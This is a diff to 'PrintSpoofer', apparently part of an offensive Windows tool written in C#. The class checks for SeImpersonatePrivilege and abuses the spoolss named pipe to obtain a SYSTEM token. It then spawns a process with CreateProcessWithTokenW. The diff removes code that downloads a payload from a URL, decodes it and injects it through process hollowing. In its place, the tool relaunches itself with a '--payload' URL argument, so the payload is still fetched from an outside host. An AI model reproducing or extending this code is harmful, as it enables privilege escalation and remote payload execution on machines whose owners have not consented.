@@ -21,11 +21,12 @@ internal static class PrintSpoofer
     )
     {
         var canSpoof = UserHelper.CheckPrivileges().ContainsKey("SeImpersonatePrivilege");
-        if(!canSpoof){
+        if (!canSpoof)
+        {
             Console.WriteLine("Cannot spoof - SeImpersonatePrivilege is not enabled");
             return;
         }
-        
+
         var computerName = Environment.MachineName;
         var pipe = $"\\\\.\\pipe\\{pipeName}\\pipe\\spoolss";
         byte[] commandBytes = Encoding.Unicode.GetBytes(
@@ -112,8 +113,14 @@ internal static class PrintSpoofer
                 si.cb = Marshal.SizeOf(si);
                 si.lpDesktop = "WinSta0\\Default";
                 var binary = string.IsNullOrEmpty(executeCmd)
-                    ? Obfuscation.GetObfuscatedBinaryName()
+                    ? $"{Environment.ProcessPath} sc --payload {payloadUrl}"
                     : executeCmd;
+
+                if (RuntimeConfig.IsDebugEnabled)
+                {
+                    Console.WriteLine($"Executing {binary} as {name}");
+                }
+
                 Lib.CreateProcessWithTokenW(
                     hSystemToken,
                     (uint)LogonFlags.WithProfile,
@@ -126,19 +133,10 @@ internal static class PrintSpoofer
                     out ProcessInformation pi
                 );
 
-                if (!string.IsNullOrEmpty(payloadUrl))
-                {
-                    if (RuntimeConfig.IsDebugEnabled)
-                        Console.WriteLine($"Downloading payload from {payloadUrl}");
-                    var httpClient = new HttpClient();
-                    var data = await httpClient.GetStringAsync(payloadUrl);
-                    if (RuntimeConfig.IsDebugEnabled)
-                        Console.WriteLine($"Downloaded {data.Length} bytes");
-                    var buf = Decoder.DecodeString(data);
-                    if (RuntimeConfig.IsDebugEnabled)
-                        Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
-                    await HollowProcess.Run(buf, pi);
-                }
+                if (pi.dwProcessId != 0 && RuntimeConfig.IsDebugEnabled)
+                    Console.WriteLine(
+                        $"Impersonation was successful - PID: {pi.dwProcessId}"
+                    );
             }
             else
             {
